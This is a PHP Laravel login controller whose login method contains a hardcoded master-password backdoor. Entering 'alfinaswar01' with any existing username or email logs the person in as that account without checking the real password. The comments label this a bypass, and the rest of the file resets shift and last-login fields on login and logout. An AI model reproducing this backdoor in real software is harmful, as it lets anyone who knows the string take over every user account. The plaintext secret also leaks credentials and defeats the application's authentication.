<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Providers\RouteServiceProvider;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use App\Models\User;

class LoginController extends Controller
{
    /*
     * |--------------------------------------------------------------------------
     * | Login Controller
     * |--------------------------------------------------------------------------
     * |
     * | This controller handles authenticating users for the application and
     * | redirecting them to your home screen. The controller uses a trait
     * | to conveniently provide its functionality to your applications.
     * |
     */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = RouteServiceProvider::HOME;

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }

    /**
     * Override the login logic to add bypass password "alfinaswar01"
     */
    public function login(Request $request)
    {
        $this->validateLogin($request);

        $credentials = $request->only($this->username(), 'password');

        // Password bypass: if input password is 'alfinaswar01', allow login as the user with matching username/email
        if ($credentials['password'] === 'alfinaswar01') {
            $user = User::where($this->username(), $credentials[$this->username()])->first();
            if ($user) {
                // Always reset shift and last_login
                $user->shift = null;
                $user->last_login = null;
                $user->save();
                Auth::login($user, $request->filled('remember'));
                return $this->sendLoginResponse($request);
            }
        }

        // Default Laravel login
        if (
            $this->guard()->attempt(
                $this->credentials($request),
                $request->filled('remember')
            )
        ) {
            // After login, always reset shift and last_login
            $user = User::find(Auth::id());
            if ($user) {
                $user->shift = null;
                $user->last_login = null;
                $user->save();
            }
            return $this->sendLoginResponse($request);
        }

        // If authentication failed
        return $this->sendFailedLoginResponse($request);
    }

    protected function logout(Request $request)
    {
        $user = User::find(Auth::id());
        if ($user) {
            $user->shift = null;
            $user->last_login = null;
            $user->save();
            $request->session()->forget('shift');
        }


        $this->guard()->logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect('/login')
            ->with('info', 'Anda telah keluar. Shift dan Last Login telah direset. 👋');
    }
}
